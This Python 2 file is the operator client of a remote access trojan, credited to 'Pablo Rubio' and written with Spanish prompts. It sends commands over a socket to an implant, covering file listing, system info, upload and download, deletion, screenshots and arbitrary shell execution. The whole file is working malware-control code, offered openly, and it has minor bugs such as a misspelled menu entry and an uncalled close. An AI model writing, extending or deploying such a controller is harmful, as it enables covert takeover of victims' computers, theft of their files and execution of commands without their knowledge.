#!/usr/bin/env python
# -*- coding: utf-8 -*-

#RAT client by Pablo Rubio

import socket
from socket import error
import os
 
server = "127.0.0.1"
port = 45456
array = []

def main():
	
	os.system('clear')
	print "*************************"
	print "RAT Client by Pablo Rubio"
	print "*************************"
	print "[*] Comandos disponibles"
	print "*************************"
	print "--> list 	(List files)"
	print "--> info 	(System info)"
	print "--> cd 		(Change directory. Add the directory like args)"
	print "--> trasfer 	(Upload & Download files)"
	print "--> delete 	(Delete a file)"
	print "--> screenshot	(Take a screenshot)"
	print "--> shell	(Execute a shell command)"
	print "--> close 	(Close conection)"
	print "*************************"
	print

	while(True):
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((server, port))
		print ''
		msg = raw_input("[*] Comando a ejecutar: ")
		array = msg.split(" ")

		if 'list' in array[0]:
			print "[*] Listando archivos:"
			client.send(array[0]);

		elif 'info' in array[0]:
			print "[*] Recopilando informacion del sistema:"
			client.send(array[0])

		elif 'cd' in array[0]:
			if len(array) == 1:
				print "Debe introducir la ruta"
				continue
			client.send(array[0]+' '+array[1])

		elif 'shell' in array[0]:
			orden = raw_input("[*] Comando shell a ejecutar: ")
			client.send(array[0]+' '+orden)
			

		elif 'close' in array[0]:
			client.send(array[0]);
			print "[_] Cerrando conexion."
			client.close()
			exit(0)

		elif 'transfer' in array[0]:	
			orden = raw_input("[*] Upload (u) // Download (d): ")
			if 'u' in orden:
				archivo = raw_input("[*] Ruta del archivo a subir: ")
				client.send('up'+' '+archivo)
				response = client.recv(1024)
				if 'go' in response:
					f = open(archivo,'rb')
					print '[*] Sending...'
					l = f.read(1024)
					while (l):
    						print '[*] Sending...'
    						client.send(l)
    						l = f.read(1024)
					f.close()
					print "[*] Archivo enviado."
					client.shutdown(socket.SHUT_WR)
					print client.recv(1024)
					client.close         
    					print("[*] El archivo ha sido enviado correctamente.")
				else:
					print("[-] Error al enviar datos.")
					continue

			elif 'd' in orden:
				archivo = raw_input("[*] Ruta del archivo a descargar: ")
				client.send('down'+' '+archivo)
				path = archivo.split("/")
				name = path[-1] 
				f = open(name, "wb")
	    			print "[*] Receiving..."
    				l = client.recv(1024)
    				while (True):
        				f.write(l)
        				l = client.recv(1024)
					if (len(l) < 1024):
						break
    				f.close()             
				print("[*] El archivo se ha recibido correctamente.")

			else:
				print '[-] Orden erronea, intentelo de nuevo.'

		elif 'delete' in array[0]:
			archivo = raw_input("[*] Ruta del archivo a borrar: ")
			client.send(array[0]+' '+archivo)
	
		elif 'screenshot' in array[0]:	
			client.send(array[0])		

		else:
			raw_input("[-] Comando no disponible. Pulse cualquier tecla para continuar.")
			continue

		response = client.recv(4096)
		print response
		

if __name__ == '__main__':
	main()
